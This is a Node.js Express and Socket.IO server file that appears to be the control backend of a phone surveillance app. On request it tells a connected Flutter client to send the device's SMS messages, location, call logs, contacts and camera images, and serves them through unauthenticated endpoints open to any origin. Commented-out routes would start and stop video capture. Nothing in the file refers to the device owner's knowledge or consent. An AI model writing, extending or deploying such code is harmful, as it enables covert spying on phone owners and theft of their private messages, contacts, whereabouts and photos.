const express = require('express');
const app = express();
const cors = require('cors');
const http = require("http").createServer(app);
const io = require("socket.io")(http);
const fs = require('fs');
app.use(cors({ origin: "*", credentials: true }));
app.use(express.json());

var globalSocket = null;

app.use('/api', require('./routes/notification'));

app.post('/test',(req,res)=>{
    console.log(req.body);
    res.send('ok');
})

app.get('/',(req,res)=>{
    res.send('ok');
})

app.get("/sms", async (req, res) => {
  if (globalSocket == null){
    return res.json({
      message: "No socket connection",
    });
  }
  globalSocket.emit("sms", "get sms");
  // Wait for the 'sms' event using async/await
  const smsData = await new Promise((resolve, reject) => {
    globalSocket.on("getsms", (data) => {
      resolve(data);
    });
  });

  // Send the received 'smsData' as a JSON response
  res.json(smsData);
});

app.get("/location", async (req, res) => {
  if (globalSocket == null)
    return res.json({
      message: "No socket connection",
    });
  globalSocket.emit("location", "get location");
  // Wait for the 'sms' event using async/await
  const locationData = await new Promise((resolve, reject) => {
    globalSocket.on("getlocation", (data) => {
      resolve(data);
    });
  });

  // Send the received 'smsData' as a JSON response
  res.json(locationData);
});


io.on("connection", (socket) => {
  console.log("A client connected");
  globalSocket = socket;
  socket.on("message", (data) => {
    console.log("Received message from Flutter:", data);
    socket.emit("message", "Hello from Node.js");
  });

  socket.on("disconnect", () => {
    console.log("A client disconnected");
  });

  // app.get("/sms", async (req, res) => {
  //   if (!socket)
  //     return res.json({
  //       message: "No socket connection",
  //     });
  //   var smsdata = {};
  //   socket.emit("sms", "get sms");
  //   // Wait for the 'sms' event using async/await
  //   const smsData = await new Promise((resolve, reject) => {
  //     socket.on("getsms", (data) => {
  //       resolve(data);
  //     });
  //   });

  //   // Send the received 'smsData' as a JSON response
  //   res.json(smsData);
  // });

  // app.get("/location", async (req, res) => {
  //   if (!socket)
  //     return res.json({
  //       message: "No socket connection",
  //     });
  //   socket.emit("location", "get location");
  //   // Wait for the 'sms' event using async/await
  //   const locationData = await new Promise((resolve, reject) => {
  //     socket.on("getlocation", (data) => {
  //       resolve(data);
  //     });
  //   });

  //   // Send the received 'smsData' as a JSON response
  //   res.json(locationData);
  // });

  app.get("/calls", async (req, res) => {
    if (!socket)
      return res.json({
        message: "No socket connection",
      });
    socket.emit("calllogs", "get call log");
    // Wait for the 'sms' event using async/await
    const callData = await new Promise((resolve, reject) => {
      socket.on("getcalllogs", (data) => {
        resolve(data);
      });
    });

    // Send the received 'smsData' as a JSON response
    res.json(callData);
  });
  
  app.get("/contacts", async (req, res) => {
    if (!socket)
      return res.json({
        message: "No socket connection",
      });
    socket.emit("contacts", "get contacts");
    
    const contactsData = await new Promise((resolve, reject) => {
      socket.on("getcontacts", (data) => {
        resolve(data);
      });
    });

    // Send the received 'smsData' as a JSON response
    res.json(contactsData);
  });
  
  app.get("/camera/:id", async (req, res) => {
    const id = parseInt(req.params.id);
    if (!socket)
      return res.json({
        message: "No socket connection",
      });
    socket.emit("camera", id);
    
    const imageData = await new Promise((resolve, reject) => {
      socket.on("getcamera", (data) => {
        resolve(data);
      });
    });
    fs.writeFile('captured.jpg', imageData, function(err) {
      if (err) throw err;
      console.log('File is created successfully.');
    });
    res.json(imageData);
  });
  
  // app.get("/startvideo/:id", async (req, res) => {
  //   const id = parseInt(req.params.id);
  //   if (!socket)
  //     return res.json({
  //       message: "No socket connection",
  //     });
  //   socket.emit("startvideo", id);
    
  //   const resData = await new Promise((resolve, reject) => {
  //     socket.on("videomsg", (data) => {
  //       console.log(data);
  //       resolve(data);
  //     });
  //   });
  //   res.send(resData);
  // });
  
  // app.get("/stopvideo", async (req, res) => {
  //   if (!socket)
  //     return res.json({
  //       message: "No socket connection",
  //     });
  //   socket.emit("stopvideo", 'stop');
    
  //   const videoData = await new Promise((resolve, reject) => {
  //     socket.on("getvideo", (data) => {
  //       console.log('video recieved');
  //       resolve(data);
  //     });
  //   });
  //   res.send(videoData);
  // });
  
  
});

http.listen(process.env.PORT || 3005, () => {
  console.log("Node.js server running on port 3005");
});